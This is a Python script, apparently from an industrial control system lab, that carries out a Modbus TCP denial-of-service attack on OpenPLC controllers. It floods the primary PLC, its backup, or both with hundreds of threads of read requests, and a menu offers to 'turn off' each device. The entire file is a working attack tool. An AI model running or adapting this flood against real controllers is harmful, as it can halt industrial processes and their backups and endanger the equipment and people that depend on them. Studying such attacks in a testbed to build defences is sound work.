import socket
import threading
import multiprocessing
import time
import struct
from config import VM1_IP

OPENPLC_IP = VM1_IP
PLC1_PORT = 502
PLC2_PORT = 504
THREADS_PER_TARGET = {"PLC1": 200, "PLC2": 450}  # PLC2 gets more to compensate for its lower baseline load
DURATION = 30

MODBUS_REQUEST = struct.pack('>HHHBBHH', 1, 0, 6, 1, 1, 0, 1)


def flood_target(label, port, duration, thread_count):
    running = [True]
    lock = threading.Lock()
    stats = {"sent": 0, "connect_failures": 0}

    def flood():
        while running[0]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((OPENPLC_IP, port))
            except Exception:
                with lock:
                    stats["connect_failures"] += 1
                time.sleep(0.5)
                continue
            while running[0]:
                try:
                    for _ in range(10):
                        s.send(MODBUS_REQUEST)
                        with lock:
                            stats["sent"] += 1
                except:
                    break
            s.close()

    threads = [threading.Thread(target=flood, daemon=True) for _ in range(thread_count)]
    for t in threads:
        t.start()

    for i in range(duration):
        time.sleep(1)
        with lock:
            print(f"[{label}] {i+1}s — sent={stats['sent']} fails={stats['connect_failures']}")
            if stats["sent"] == 0 and stats["connect_failures"] > thread_count:
                print(f"[!] [{label}] zero sent, connections failing repeatedly — blocked or down")

    running[0] = False
    print(f"[{label}] Done")


def main():
    print("=" * 46)
    print("  Modbus DoS Attack")
    print("=" * 46)
    print("What do you want to do?")
    print("  [1] Turn off PLC 1")
    print("  [2] Turn off PLC 2 (backup)")
    print("  [3] Turn off both")

    while True:
        choice = input("Enter 1, 2, or 3: ").strip()
        if choice in ("1", "2", "3"):
            break
        print("[!] Invalid input — enter 1, 2, or 3.")

    if choice == "1":
        targets = [("PLC1", PLC1_PORT)]
    elif choice == "2":
        targets = [("PLC2", PLC2_PORT)]
    else:
        targets = [("PLC1", PLC1_PORT), ("PLC2", PLC2_PORT)]

    print(f"[*] Targeting: {', '.join(f'{l} ({OPENPLC_IP}:{p}, {THREADS_PER_TARGET[l]} threads)' for l, p in targets)}")

    processes = [
        multiprocessing.Process(target=flood_target, args=(label, port, DURATION, THREADS_PER_TARGET[label]))
        for label, port in targets
    ]
    for p in processes:
        p.start()
    for p in processes:
        p.join()

    print("[*] All targets done")


if __name__ == "__main__":
    main()